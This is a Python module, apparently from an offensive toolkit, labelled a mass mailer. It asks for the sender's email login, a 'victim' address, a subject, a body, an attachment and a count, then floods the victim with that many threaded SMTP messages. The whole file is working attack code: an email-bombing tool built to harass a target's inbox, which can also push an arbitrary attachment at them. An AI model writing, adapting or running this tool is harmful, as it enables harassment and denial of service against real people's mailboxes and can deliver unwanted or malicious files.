import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from core import ccolors
import os
from threading import Thread
from time import sleep


emails_sent = 0


def send_mail():
    try:
        global emails_sent
        msg = MIMEMultipart()
        msg['From'] = email_user
        msg['To'] = email_send
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))
        attachment = open(filename, 'rb')
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', "attachment; filename= " + filename)
        msg.attach(part)
        text = msg.as_string()
        server = smtplib.SMTP(smtp, smtp_port)
        server.starttls()
        server.login(email_user, email_password)
        server.sendmail(email_user, email_send, text)
        server.quit()
        emails_sent += 1
    except:
        print(ccolors.warn + "<!> An error occurred while trying to send email" + ccolors.end)


def start(path):
    global email_user, email_send, subject, filename, email_password, body, thr, smtp_port, smtp
    thr =[]
    print(ccolors.gold + "[MASS-MAILER]" + ccolors.end)
    email_user = str(input(ccolors.red + "[Your email address]> " + ccolors.end))
    email_password = str(input(ccolors.red + "[Your email password]> " + ccolors.end))
    email_send = str(input(ccolors.red + "[Victims email]> " + ccolors.end))
    not_answered = True
    while not_answered:
        smtp_ask = str(input(ccolors.red + "[Default smtp server is google smtp. Do you want to change it? {Yes/no}]> " + ccolors.end))
        if smtp_ask == "Yes":
            not_answered = False
            smtp = str(input(ccolors.red + "[SMTP Server (ex. smtp.gmail.com)]> " + ccolors.end))
            try:
                smtp_port = int(input(ccolors.red + "[STMP Server Port}> " + ccolors.end))
            except:
                print(ccolors.warn + "<!> SMTP server port must be specified as Integer" + ccolors.end)
                return None
        elif smtp_ask == "no":
            not_answered = False
            smtp = "smtp.gmail.com"
            smtp_port = 587
    os.system("clear")
    print(ccolors.red + "[Your email]> " + email_user + ccolors.end)
    pw = ""
    for x in range(len(email_password)):
        pw = pw + "*"
    print(ccolors.red + "[Email password]> " + pw + ccolors.end)
    print(ccolors.red + "[Victims email> " + email_send + ccolors.end)
    subject = str(input("\n\n\n" + ccolors.red + "[Email Subject]> " + ccolors.end))
    body = str(input(ccolors.red + "[Email body]> " + ccolors.end))
    filename = path + str(input(ccolors.red + "[Filename]>" + ccolors.end))
    if not os.path.exists(filename):
        print(ccolors.warn + "<!> Directory " + filename + " does not exists" + ccolors.end)
        return None
    try:
        numOmails = int(input(ccolors.red + "[How many emails do you want to send?]> " + ccolors.end))
    except:
        print(ccolors.warn + "<!> Must be specified as Integer" + ccolors.end)
        return None
    print(ccolors.blue + "Sending emails..." + ccolors.end)
    for x in range(numOmails):
        t = Thread(target=send_mail)
        thr.append(t)
    for x in range(numOmails):
        sleep(0.5)
        thr[x].start()
    for x in range(numOmails):
        thr[x].join()
    os.system("clear")
    print(ccolors.green + "Successfully sent " + str(emails_sent) + " of " + str(numOmails) + " emails" + ccolors.end)
